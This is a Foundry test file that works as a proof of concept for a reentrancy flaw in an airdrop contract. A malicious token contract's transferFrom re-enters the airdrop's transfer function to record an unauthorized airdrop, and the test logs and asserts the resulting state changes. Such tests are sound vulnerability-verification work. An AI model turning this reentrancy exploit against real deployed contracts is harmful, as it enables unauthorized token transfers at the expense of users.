// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa1fceeff3acc57d257b917e30c4df661401d6431.sol";

contract MaliciousToken {
    AirDropContract public airDrop;
    bool private _shouldReenter;

    function setAirDropContract(address _airDrop) public {
        airDrop = AirDropContract(_airDrop);
    }

    function toggleReentrancy(bool status) public {
        _shouldReenter = status;
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        if (_shouldReenter) {
            _shouldReenter = false;
            
            address[] memory r_tos = new address[](1);
            r_tos[0] = address(0xCAFE);
            
            uint[] memory r_values = new uint[](1);
            r_values[0] = 1;
            
            airDrop.transfer(address(this), r_tos, r_values);
        }
        return true;
    }
}

contract AirDropReentrancyTest is Test {
    AirDropContract public airDrop;
    MaliciousToken public token;
    
    address internal constant RECIPIENT1 = address(0xB0B1);
    address internal constant RECIPIENT2 = address(0xDEF);
    address internal constant RECIPIENT_REENTER = address(0xCAFE);

    function setUp() public {
        airDrop = new AirDropContract();
        token = new MaliciousToken();
        
        token.setAirDropContract(address(airDrop));
        token.toggleReentrancy(true);
    }

    function testReentrancyInTransfer() public {
        address[] memory tos = new address[](2);
        tos[0] = RECIPIENT1;
        tos[1] = RECIPIENT2;
        
        uint[] memory vs = new uint[](2);
        vs[0] = 10;
        vs[1] = 20;
        
        // === BEFORE Trigger ===
        console2.log("--- BEFORE-Trigger Attack ---");
        (uint count1_before, uint amt1_before) = airDrop.getUserStats(RECIPIENT1);
        (uint count2_before, uint amt2_before) = airDrop.getUserStats(RECIPIENT2);
        (uint countRe_before, uint amtRe_before) = airDrop.getUserStats(RECIPIENT_REENTER);
        
        uint totalAirdrops_before = airDrop.totalAirdrops();
        uint totalTokensDistributed_before = airDrop.totalTokensDistributed();
        
        console2.log("RECIPIENT1 (before): count=%s amount=%s", count1_before, amt1_before);
        console2.log("RECIPIENT2 (before): count=%s amount=%s", count2_before, amt2_before);
        console2.log("RECIPIENT_REENTER (before): count=%s amount=%s", countRe_before, amtRe_before);
        console2.log("totalAirdrops (before):", totalAirdrops_before);
        console2.log("totalTokensDistributed (before):", totalTokensDistributed_before);
        console2.log("");

        // === TRIGGER ===
        console2.log("--- Trigger Attack: transfer() ---");
        airDrop.transfer(address(token), tos, vs);
        console2.log("");

        // === AFTER Trigger ===
        console2.log("--- AFTER-Trigger Attack ---");
        (uint count1_after, uint amt1_after) = airDrop.getUserStats(RECIPIENT1);
        (uint count2_after, uint amt2_after) = airDrop.getUserStats(RECIPIENT2);
        (uint countRe_after, uint amtRe_after) = airDrop.getUserStats(RECIPIENT_REENTER);
        
        uint totalAirdrops_after = airDrop.totalAirdrops();
        uint totalTokensDistributed_after = airDrop.totalTokensDistributed();
        
        console2.log("RECIPIENT1 (after): count=%s amount=%s", count1_after, amt1_after);
        console2.log("RECIPIENT2 (after): count=%s amount=%s", count2_after, amt2_after);
        console2.log("RECIPIENT_REENTER (after): count=%s amount=%s", countRe_after, amtRe_after);
        console2.log("totalAirdrops (after):", totalAirdrops_after);
        console2.log("totalTokensDistributed (after):", totalTokensDistributed_after);
        console2.log("");

        // === STATE COMPARISON ===
        console2.log("--- STATE COMPARISON RESULTS ---");
        bool reentrancyDetected = false;
        
        if (countRe_after > countRe_before) {
            console2.log("CHANGE: RECIPIENT_REENTER count increased from %s to %s", 
                        countRe_before, countRe_after);
            reentrancyDetected = true;
        }
        
        if (amtRe_after > amtRe_before) {
            console2.log("CHANGE: RECIPIENT_REENTER amount increased from %s to %s", 
                        amtRe_before, amtRe_after);
            reentrancyDetected = true;
        }
        
        // Final vulnerability verdict
        console2.log("[VULNERABILITY VERDICT] Analysis Complete");
        if (reentrancyDetected) {
            console2.log("Vulnerability Exists: Unauthorized airdrop created during token transfer operation");
        } else {
            console2.log("Vulnerability not Exist: No state changes indicate reentrancy vulnerability");
        }

        // Assertions to validate exact values
        assertEq(amt1_after, 10, "RECIPIENT1 amount mismatch");
        assertEq(count1_after, 1, "RECIPIENT1 count mismatch");
        assertEq(amt2_after, 20, "RECIPIENT2 amount mismatch");
        assertEq(count2_after, 1, "RECIPIENT2 count mismatch");
        assertEq(amtRe_after, 1, "RECIPIENT_REENTER amount mismatch");
        assertEq(countRe_after, 1, "RECIPIENT_REENTER count mismatch");
        assertEq(totalAirdrops_after, 2, "Total airdrop count mismatch");
        assertEq(totalTokensDistributed_after, 31, "Total tokens distributed mismatch");
    }
}